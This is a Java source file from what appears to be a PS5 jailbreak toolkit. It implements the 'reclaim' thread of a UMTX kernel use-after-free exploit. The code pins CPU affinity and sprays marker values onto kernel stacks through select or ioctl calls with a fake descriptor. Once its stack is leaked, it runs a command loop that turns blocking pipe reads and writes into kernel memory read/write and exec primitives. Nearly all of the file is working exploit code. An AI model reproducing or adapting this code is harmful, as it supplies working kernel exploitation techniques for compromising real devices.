package org.ps5jb.client.payloads.umtx.impl1;

import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

import org.ps5jb.client.payloads.umtx.common.DebugStatus;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.sdk.include.sys.CpuSet;
import org.ps5jb.sdk.include.sys.ErrNo;
import org.ps5jb.sdk.include.sys.IocCom;
import org.ps5jb.sdk.include.sys.RtPrio;
import org.ps5jb.sdk.include.sys.cpuset.CpuSetType;

public class ReclaimJob extends CommonJob {
    // Supported commands.
    public static final int CMD_NOOP = 0;
    public static final int CMD_READ = 1;
    public static final int CMD_WRITE = 2;
    public static final int CMD_EXEC = 3;
    public static final int CMD_EXIT = 4;

    private final State state;
    private final ErrNo errNo;
    private final CpuSet cpuSet;

    private final int index;
    private final int marker;
    private final Pointer markerAddress;
    private final Pointer markerCopyAddress;

    private CpuSetType initialCpuAffinity;

    private boolean isTarget;

    private AtomicInteger currentCommand;
    private AtomicBoolean commandWaitFlag;
    private AtomicLong commandArg1;
    private AtomicLong commandArg2;
    private AtomicLong commandArg3;
    private AtomicLong commandResult;
    private AtomicInteger commandErrNo;
    private Runnable commandRunnable;

    public ReclaimJob(int index, State state) {
        super();

        this.errNo = new ErrNo(this.libKernel);
        this.cpuSet = new CpuSet(this.libKernel);
        this.index = index;
        this.state = state;

        this.jobName = "reclaim#" + index;
        this.marker = Config.RECLAIM_THREAD_MARKER_BASE | ((0x41 + index + 1) << 24);
        if (Config.markerMethod.getMarkerSize() > 0) {
            this.markerAddress = this.state.reclaimJobStatesAddress.inc(index * ((long) Config.markerMethod.getMarkerSize()));
            this.markerCopyAddress = this.markerAddress.inc(Config.markerMethod.getMarkerSize() / 2);
        } else {
            this.markerAddress = Pointer.NULL;
            this.markerCopyAddress = Pointer.NULL;
        }
        this.isTarget = false;
    }

    protected void prepare() throws SdkException {
        super.prepare();

        initialCpuAffinity = cpuSet.getCurrentThreadAffinity();
        if (DebugStatus.isTraceEnabled()) {
            DebugStatus.trace("Initial CPU affinity of '" + jobName + "' = " + initialCpuAffinity);
        }

        if (Config.toggleReclaimCpuAffinityMask) {
            if (Config.toggleDestroyerAffinityOnReclaimThread && this.state.destroyerThreadIndex != -1) {
                cpuSet.setCurrentThreadAffinity(this.state.DESTROYER_THREAD_CORES[this.state.destroyerThreadIndex]);
                if (this.index == 0) {
                    DebugStatus.info("Set affinity to " + libKernel.sceKernelGetCurrentCpu() + " from destroyer #" + this.state.destroyerThreadIndex);
                }
            } else {
                cpuSet.setCurrentThreadAffinity(this.state.LOOKUP_THREAD_CORES);
                if (this.index == 0) {
                    DebugStatus.info("Set affinity to " + libKernel.sceKernelGetCurrentCpu() + " from lookup");
                }
            }
        }

        if (Config.toggleSetThreadPriorities && Config.toggleEnableThreadPriorityForReclaimThreads) {
            RtPrio rtprio = new RtPrio(this.libKernel);
            rtprio.setRtPrio(0, Config.RECLAIM_THREAD_PRIORITY);
        }

        // Prepare thread marker which will be used to determine victim thread ID: 41 41 41 [41 + index]
        if (Config.markerMethod == KernelStackMarkerMethod.BLOCKING_SELECT) {
            markerAddress.write8(((long) marker) << 32);
        } else if (Config.markerMethod == KernelStackMarkerMethod.IOCTL) {
            final int count = Config.markerMethod.getMarkerSize() / 4;
            for (int i = 0; i < count; i++) {
                markerAddress.write4(i * 0x4, marker);
            }
        }
    }

    protected void work() throws SdkException {
        DebugStatus.trace("Waiting for ready flag");
        while (!this.state.readyFlag.get()) {
            Thread.yield();
        }

        DebugStatus.trace("Starting loop");

        // Wait loop that runs until kernel stack is obtained.
        IocCom ioccom = new IocCom(this.libKernel);
        while (!this.state.destroyFlag.get()) {
            if (Config.markerMethod == KernelStackMarkerMethod.BLOCKING_SELECT) {
                DebugStatus.trace("Doing blocking call");

                // Use copy of marker because `select` may overwrite its contents.
                markerAddress.copyTo(markerCopyAddress, 0, Config.markerMethod.getMarkerSize() / 2);
                this.libKernel.select(1, markerCopyAddress, Pointer.NULL, Pointer.NULL, this.state.timeoutAddress.getPointer());
                Thread.yield();
            } else if (Config.markerMethod == KernelStackMarkerMethod.IOCTL) {
                final int fakeDescriptor = 0xBEEF;
                for (int i = 0; i < Config.MAX_RECLAIM_SYSTEM_CALLS; i++) {
                    ioccom.ioctl(fakeDescriptor, IocCom._IOW(0, 0, Config.markerMethod.getMarkerSize()), markerAddress.addr());
                }
                Thread.yield();
            } else {
                this.libKernel.sched_yield(this.marker);
            }

            // Check if leaked kernel stack belongs to this thread.
            if (isTarget) {
                DebugStatus.info("I am lucky");

                if (Config.toggleReclaimCpuAffinityMask) {
                    cpuSet.setCurrentThreadAffinity(initialCpuAffinity);
                }

                break;
            }
        }

        DebugStatus.trace("Finishing loop");

        if (isTarget) {
            DebugStatus.debug("Waiting for ready flag");
            while (!this.state.readyFlag.get()) {
                Thread.yield();
            }

            // Lock execution temporarily using blocking call by reading from empty pipe.
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("Reading from read pipe #" + this.state.readPipeDescriptor);
            }
            final long result = this.libKernel.read(this.state.readPipeDescriptor, this.state.pipeBufferAddress, Config.MAX_PIPE_BUFFER_SIZE);
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("Reading from read pipe #" + this.state.readPipeDescriptor + " finished with result " + result);
            }
            if (result == Config.MAX_PIPE_BUFFER_SIZE) {
                DebugStatus.notice("Starting command processor loop");
                handleCommands();
                DebugStatus.notice("Stopping command processor loop");
            } else if (result == -1L) {
                DebugStatus.error("read failed with error code: " + this.errNo.getLastError());
            } else {
                DebugStatus.error("Unexpected result after reading from pipe " + result);
            }
            DebugStatus.notice("Ending target thread");
        } else {
            DebugStatus.notice("Not target thread");
        }
    }

    protected void postprocess() {
        super.postprocess();

        if (this.initialCpuAffinity != null) {
            this.initialCpuAffinity.free();
            this.initialCpuAffinity = null;
        }
    }

    public boolean isCommandProccesorRunning() {
        return currentCommand != null && currentCommand.get() != CMD_EXIT;
    }

    private void handleCommands() {
        commandWaitFlag = new AtomicBoolean(false);
        commandArg1 = new AtomicLong(0);
        commandArg2 = new AtomicLong(0);
        commandArg3 = new AtomicLong(0);
        commandResult = new AtomicLong(0);
        commandErrNo = new AtomicInteger(0);

        // Must be initialized last.
        currentCommand = new AtomicInteger(CMD_NOOP);

        boolean doExit = false;
        while (!doExit) {
            final int cmd = currentCommand.get();
            if (cmd != CMD_NOOP) {
                currentCommand.set(CMD_NOOP);

                commandResult.set(-1L);
                commandErrNo.set(0);

                switch (cmd) {
                    case CMD_READ:
                        DebugStatus.trace("Processing read command");
                        handleCommandRead(commandArg1.get(), commandArg2.get(), commandArg3.get());
                        DebugStatus.trace("Done processing read command");
                        break;

                    case CMD_WRITE:
                        DebugStatus.trace("Processing write command");
                        handleCommandWrite(commandArg1.get(), commandArg2.get(), commandArg3.get());
                        DebugStatus.trace("Done processing write command");
                        break;

                    case CMD_EXEC:
                        DebugStatus.trace("Processing exec command");
                        handleCommandExec();
                        DebugStatus.trace("Done processing exec command");
                        break;

                    default:
                        if (DebugStatus.isNoticeEnabled()) {
                            DebugStatus.notice("Unsupported command: " + cmd);
                        }
                        doExit = true;
                }

                commandWaitFlag.set(false);
            }

            Thread.yield();
        }
    }

    protected void handleCommandRead(long srcAddress, long dstAddress, long size) {
        DebugStatus.trace("Doing blocking write");

        Thread.yield();

        // Do blocking write pipe call.
        final long result = this.libKernel.write(this.state.writePipeDescriptor, this.state.pipeBufferAddress, size);

        DebugStatus.trace("Finishing blocking write");

        commandResult.set(result);
        commandErrNo.set(this.errNo.errno());
    }

    protected void handleCommandWrite(long srcAddress, long dstAddress, long size) {
        DebugStatus.trace("Doing blocking read");

        Thread.yield();

        // Do blocking read pipe call.
        final long result = this.libKernel.read(this.state.readPipeDescriptor, this.state.pipeBufferAddress, size);

        DebugStatus.trace("Finishing blocking read");

        commandResult.set(result);
        commandErrNo.set(this.errNo.errno());
    }

    private void handleCommandExec() {
        if (commandRunnable != null) {
            commandRunnable.run();
            commandRunnable = null;
        }
    }

    public void setTarget(boolean flag) {
        isTarget = flag;
    }

    public boolean isTarget() {
        return isTarget;
    }

    public int getCommand() {
        return currentCommand.get();
    }

    public void setCommand(int cmd) {
        if (!(cmd >= CMD_NOOP && cmd <= CMD_EXIT)) {
            throw new IllegalArgumentException("Invalid cmd: " + cmd);
        }

        currentCommand.set(cmd);
    }

    public boolean getCommandWaitFlag() {
        return commandWaitFlag.get();
    }

    public void setCommandWaitFlag(boolean flag) {
        commandWaitFlag.set(flag);
    }

    public long getCommandArg(int index) {
        if (!(index >= 0 && index <= 2)) {
            throw new ArrayIndexOutOfBoundsException(index);
        }

        switch (index) {
            case 0:
                return commandArg1.get();
            case 1:
                return commandArg2.get();
            case 2:
                return commandArg3.get();
            default:
                return 0;
        }
    }

    public void setCommandArg(int index, long arg) {
        if (!(index >= 0 && index <= 2)) {
            throw new ArrayIndexOutOfBoundsException(index);
        }

        switch (index) {
            case 0:
                commandArg1.set(arg);
                break;
            case 1:
                commandArg2.set(arg);
                break;
            case 2:
                commandArg3.set(arg);
                break;
        }
    }

    public long getCommandResult() {
        return commandResult.get();
    }

    public int getCommandErrNo() {
        return commandErrNo.get();
    }

    public void setCommandRunnable(Runnable runnable) {
        commandRunnable = runnable;
    }
}